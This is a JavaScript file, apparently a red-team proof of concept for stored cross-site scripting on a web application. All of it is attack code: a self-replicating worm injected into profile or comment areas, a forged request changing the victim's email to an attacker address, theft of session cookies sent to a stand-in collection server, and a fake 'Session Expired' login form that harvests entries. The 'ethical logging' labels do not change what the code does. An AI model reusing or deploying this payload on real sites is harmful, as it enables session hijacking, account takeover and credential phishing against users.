(function() {
    if (document.getElementById('xss-worm')) return; // Prevent duplicates

    // Inject itself for persistence
    var script = document.createElement('script');
    script.id = 'xss-worm';
    script.innerHTML = '(' + arguments.callee.toString() + ')();';
    document.body.appendChild(script);

    // Define self-replicating payload
    var payload = `<script id="xss-worm">
        (function() {
            if (document.getElementById('xss-worm')) return;
            var script = document.createElement('script');
            script.id = 'xss-worm';
            script.innerHTML = '(' + arguments.callee.toString() + ')();';
            document.body.appendChild(script);
        })();
    </script>`;

    // Simulate persistent XSS injection into a stored area
    var targetElement = document.getElementById("user-profile") || document.getElementById("comment-section");
    if (targetElement) {
        targetElement.innerHTML += payload;
    }

    // 🔗 CSRF Attack Simulation: Change User Email
    fetch('/change-email', {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'email=attacker@redteam.com'
    });

    // 🔗 Session Hijacking (Demo - Ethical logging)
    var sessionData = document.cookie;
    fetch('https://your-redteam-server/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            event: 'XSS Session Test',
            session: sessionData,
            affectedPage: window.location.href
        })
    });

    // 🔗 Fake Login Phishing Simulation
    var fakeLogin = `
        <form id="fake-login" onsubmit="event.preventDefault(); sendFakeLogin();">
            <h3>Session Expired - Please Reauthenticate</h3>
            <input type="text" id="username" placeholder="Username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <script>
        function sendFakeLogin() {
            fetch('https://your-redteam-server/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    event: 'Fake Login Submitted',
                    username: document.getElementById('username').value
                })
            });
            alert('XSS Test: Fake login submitted.');
        }
        </script>
    `;

    document.body.innerHTML += fakeLogin;

    // Ethical Logging
    fetch('https://your-redteam-server/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            event: 'XSS PoC Executed',
            timestamp: new Date().toISOString(),
            affectedPage: window.location.href
        })
    });

    // Proof-of-concept alert
    alert('XSS Test Payload Executed. If you see this, stored XSS is possible.');

})();
